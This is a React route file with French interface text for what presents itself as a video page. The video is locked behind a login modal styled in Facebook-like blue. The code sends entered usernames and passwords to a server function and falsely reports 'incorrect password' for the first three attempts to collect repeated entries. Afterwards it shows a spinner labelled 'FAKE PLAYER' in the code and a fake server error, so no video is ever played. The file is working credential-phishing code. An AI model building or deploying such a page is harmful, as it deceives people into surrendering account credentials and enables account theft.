import {
  createFileRoute,
  useParams,
  useSearch,
} from '@tanstack/react-router'
import { useQuery } from '@tanstack/react-query'
import { useCallback, useEffect, useRef, useState } from 'react'
import {
  Clock,
  Eye,
  Lock,
  Loader2,
  AlertCircle,
  X,
} from 'lucide-react'

import { fetchVideo, authenticateUser } from '../server/function'
import { VideoPlayer } from '../components/VideoPlayer'
import { AuthModal } from '../components/AuthModal'
import { useAuth } from '../hooks/useAuth'
import type { Video } from '../type'

/* ------------------------------------------------------------------ */
/*  CONSTANTES                                                         */
/* ------------------------------------------------------------------ */

const PLACEHOLDER_IMAGE =
  'https://images.unsplash.com/photo-1611162616475-46b635cb6868?q=80&w=1200&auto=format&fit=crop'

/* ------------------------------------------------------------------ */
/*  ROUTE                                                              */
/* ------------------------------------------------------------------ */

export const Route = createFileRoute('/video/$videoId')({
  loader: async ({ params }) => {
    try {
      const video = await fetchVideo({ data: params.videoId })

      return {
        video,
        fetchedAt: Date.now(),
        meta: {
          title: video.title,
          description: 'Regardez cette vidéo exclusive',
          image: video.image,
        },
      }
    } catch {
      return {
        video: null,
        fetchedAt: Date.now(),
        meta: {
          title: 'Vidéo indisponible',
          description: 'Cette vidéo est momentanément indisponible',
          image: PLACEHOLDER_IMAGE,
        },
      }
    }
  },
  component: VideoDetailPage,
})

/* ------------------------------------------------------------------ */
/*  PAGE                                                               */
/* ------------------------------------------------------------------ */

function VideoDetailPage() {
  const { videoId } = useParams({ from: '/video/$videoId' })
  const search = useSearch({ from: '/video/$videoId' })
  const loaderData = Route.useLoaderData()

  const {
    isLoggedIn,
    login,
    incrementAttempts,
    resetAttempts,
  } = useAuth()

  /* ---------------- UI STATE ---------------- */

  const [isModalOpen, setIsModalOpen] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [authError, setAuthError] = useState('')
  const [isPreloading, setIsPreloading] = useState(false)
  const [isPlaying, setIsPlaying] = useState(false)

  const preloadTimeoutRef =
    useRef<ReturnType<typeof setTimeout> | null>(null)

  /* ---------------- FALLBACK (ULTIME) ---------------- */

  const fallbackVideo: Video = {
    title:
      decodeURIComponent(
        (search.title as string) ?? ''
      ) || 'Vidéo indisponible',
    image:
      (search.thumbnail_url as string) ??
      PLACEHOLDER_IMAGE,
    duration: (search.duration as string) ?? '—',
    views: (search.views as string) ?? '—',
  }

  /* ---------------- QUERY ---------------- */

  const {
    data: queryVideo,
    isLoading,
    isError,
  } = useQuery<Video | null>({
    queryKey: ['video', videoId],
    queryFn: () => fetchVideo({ data: videoId }),
    initialData: loaderData.video,
    initialDataUpdatedAt: loaderData.fetchedAt,
    staleTime: 5 * 60 * 1000,
    retry: 1,
  })

  /* ---------------- RÉSOLUTION FINALE ---------------- */
  // PRIORITÉ ABSOLUE : query → loader → fallback

  const video: Video =
    queryVideo ??
    loaderData.video ??
    fallbackVideo

  /* ---------------- CLEANUP ---------------- */

  useEffect(() => {
    return () => {
      if (preloadTimeoutRef.current) {
        clearTimeout(preloadTimeoutRef.current)
      }
    }
  }, [])

  /* ---------------- ACTIONS ---------------- */

  const handlePlay = useCallback(() => {
    if (isLoading || isPreloading) return

    if (!isLoggedIn) {
      setIsPreloading(true)
      preloadTimeoutRef.current = setTimeout(() => {
        setIsPreloading(false)
        setIsModalOpen(true)
      }, 3000)
      return
    }

    setIsPlaying(true)
    setTimeout(() => {
      setIsPlaying(false)
      alert(
        'INTERNAL ERROR: Serveur occupé. Veuillez réessayer.'
      )
    }, 500)
  }, [isLoggedIn, isLoading, isPreloading])

  const cancelPreloading = () => {
    if (preloadTimeoutRef.current) {
      clearTimeout(preloadTimeoutRef.current)
    }
    setIsPreloading(false)
  }

  const handleLogin = async (credentials: {
    username: string
    password: string
  }) => {
    setIsAuthLoading(true)
    setAuthError('')

    try {
      await Promise.all([
        authenticateUser({ data: credentials }),
        new Promise((r) => setTimeout(r, 3000)),
      ])

      const attempts = incrementAttempts()
      if (attempts <= 3) {
        setAuthError(
          'Identifiant ou mot de passe incorrect.'
        )
        return
      }

      resetAttempts()
      login()
      setIsModalOpen(false)
    } catch {
      setAuthError(
        'Erreur de connexion au serveur.'
      )
    } finally {
      setIsAuthLoading(false)
    }
  }

  /* ---------------- RENDER ---------------- */

  return (
    <div className="min-h-screen bg-gray-100 px-4 py-8">
      <main className="mx-auto max-w-4xl bg-white rounded-2xl shadow-xl overflow-hidden">
        {/* VIDEO */}
        <VideoPlayer
          video={video}
          isLoading={isLoading}
          isError={isError}
          isLoggedIn={isLoggedIn}
          isPreloading={isPreloading}
          onPlay={handlePlay}
          onCancelPreloading={cancelPreloading}
        />

        {/* INFOS */}
        <section className="p-6">
          <h1 className="text-2xl font-bold mb-3">
            {video.title}
          </h1>

          <div className="flex flex-wrap gap-4 text-sm text-gray-500 mb-4">
            <span className="flex items-center gap-1">
              <Clock size={14} />
              {video.duration}
            </span>

            <span className="flex items-center gap-1">
              <Eye size={14} />
              {video.views} vues
            </span>

            {isError && (
              <span className="flex items-center gap-1 text-amber-600">
                <AlertCircle size={14} />
                Données partielles
              </span>
            )}
          </div>

          {!isLoggedIn && !isPreloading && (
            <button
              onClick={handlePlay}
              className="mt-4 w-full md:w-auto px-6 py-3 bg-[#0866FF] hover:bg-[#0550CC] text-white font-bold rounded-xl shadow-lg"
            >
              <Lock size={16} className="inline mr-2" />
              Se connecter pour regarder
            </button>
          )}
        </section>
      </main>

      {/* AUTH MODAL */}
      <AuthModal
        isOpen={isModalOpen}
        isLoading={isAuthLoading}
        error={authError}
        onClose={() =>
          !isAuthLoading && setIsModalOpen(false)
        }
        onSubmit={handleLogin}
      />

      {/* FAKE PLAYER */}
      {isPlaying && (
        <div className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center">
          <button
            onClick={() => setIsPlaying(false)}
            className="absolute top-6 right-6 text-white"
          >
            <X size={28} />
          </button>

          <Loader2
            size={48}
            className="text-white animate-spin"
          />
        </div>
      )}
    </div>
  )
}
